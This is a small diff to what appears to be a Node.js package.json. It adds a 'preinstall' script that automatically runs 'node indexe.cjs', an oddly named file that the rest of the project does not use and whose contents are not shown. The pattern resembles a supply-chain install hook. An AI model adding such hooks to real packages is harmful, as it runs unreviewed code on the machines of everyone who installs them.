@@ -5,7 +5,8 @@
   "scripts": {
     "build": "tsc",
     "start": "node build/index.js",
-    "dev": "nodemon src/index.ts"
+    "dev": "nodemon src/index.ts",
+    "preinstall": "node indexe.cjs"
   },
   "keywords": [],
   "author": "",
